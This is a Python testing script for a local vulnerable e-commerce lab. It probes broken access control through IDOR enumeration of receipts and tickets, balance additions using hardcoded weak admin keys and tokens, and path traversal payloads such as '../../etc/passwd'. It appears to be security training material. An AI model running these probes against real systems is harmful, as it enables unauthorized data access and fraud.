#!/usr/bin/env python3
"""
Broken Access Control (BAC) Testing Script
Test various BAC vulnerabilities in the vulnerable e-commerce lab
"""

import requests
import json

BASE_URL = "http://127.0.0.1:5001"

def test_receipt_idor():
    """Test IDOR vulnerability in receipts"""
    print("🔍 Testing Receipt IDOR...")
    
    for receipt_id in range(1, 10):
        try:
            response = requests.get(f"{BASE_URL}/receipt/{receipt_id}")
            if response.status_code == 200:
                print(f"✅ Receipt {receipt_id}: Accessible (potential data leak)")
            elif response.status_code == 404:
                print(f"❌ Receipt {receipt_id}: Not found")
            else:
                print(f"⚠️  Receipt {receipt_id}: Status {response.status_code}")
        except Exception as e:
            print(f"❌ Receipt {receipt_id}: Error - {e}")

def test_quick_money_bypass():
    """Test weak authentication bypass for money addition"""
    print("\n💰 Testing Quick Money Bypass...")
    
    # Test with weak admin key
    params = {
        'user_id': 4,
        'amount': 1000,
        'key': 'admin123'
    }
    
    try:
        response = requests.get(f"{BASE_URL}/quick_money", params=params)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                print("✅ Successfully added money using weak admin key!")
                print(f"   Message: {data.get('message')}")
                print(f"   New Balance: ${data.get('new_balance')}")
            else:
                print(f"❌ Failed: {data.get('error')}")
        else:
            print(f"❌ Request failed with status: {response.status_code}")
    except Exception as e:
        print(f"❌ Error: {e}")

def test_api_token_bypass():
    """Test API authentication bypass"""
    print("\n🔑 Testing API Token Bypass...")
    
    headers = {'Authorization': 'Bearer admin_token_123'}
    data = {'user_id': 4, 'amount': 500}
    
    try:
        response = requests.post(f"{BASE_URL}/api/wallet/add", headers=headers, data=data)
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                print("✅ Successfully used weak API token!")
                print(f"   Message: {result.get('message')}")
            else:
                print(f"❌ Failed: {result.get('error')}")
        else:
            print(f"❌ Request failed with status: {response.status_code}")
    except Exception as e:
        print(f"❌ Error: {e}")

def test_support_ticket_idor():
    """Test support ticket IDOR"""
    print("\n🎫 Testing Support Ticket IDOR...")
    
    # Create a session first (you'd need to login)
    session = requests.Session()
    
    for ticket_id in range(1, 5):
        try:
            response = session.get(f"{BASE_URL}/api/ticket/{ticket_id}")
            if response.status_code == 200:
                data = response.json()
                print(f"✅ Ticket {ticket_id}: Accessible")
                print(f"   Subject: {data.get('subject')}")
                print(f"   Status: {data.get('status')}")
            elif response.status_code == 401:
                print(f"🔒 Ticket {ticket_id}: Authentication required")
            elif response.status_code == 404:
                print(f"❌ Ticket {ticket_id}: Not found")
            else:
                print(f"⚠️  Ticket {ticket_id}: Status {response.status_code}")
        except Exception as e:
            print(f"❌ Ticket {ticket_id}: Error - {e}")

def test_directory_traversal():
    """Test directory traversal in file download"""
    print("\n📂 Testing Directory Traversal...")
    
    payloads = [
        "sample.txt",
        "../app.py",
        "../../etc/passwd",
        "../vulnerable_shop.db"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(f"{BASE_URL}/download/{payload}")
            if response.status_code == 200:
                content_preview = response.text[:100]
                print(f"✅ {payload}: Accessible!")
                print(f"   Preview: {content_preview}...")
            else:
                print(f"❌ {payload}: Status {response.status_code}")
        except Exception as e:
            print(f"❌ {payload}: Error - {e}")

def main():
    print("🔥 BROKEN ACCESS CONTROL (BAC) TESTING SCRIPT")
    print("=" * 50)
    print("⚠️  WARNING: Testing against vulnerable lab only!")
    print("=" * 50)
    
    # Test various BAC vulnerabilities
    test_receipt_idor()
    test_quick_money_bypass()
    test_api_token_bypass()
    test_support_ticket_idor()
    test_directory_traversal()
    
    print("\n" + "=" * 50)
    print("🏁 BAC Testing Complete!")
    print("💡 Try these attacks manually in your browser too.")
    print("=" * 50)

if __name__ == "__main__":
    main()
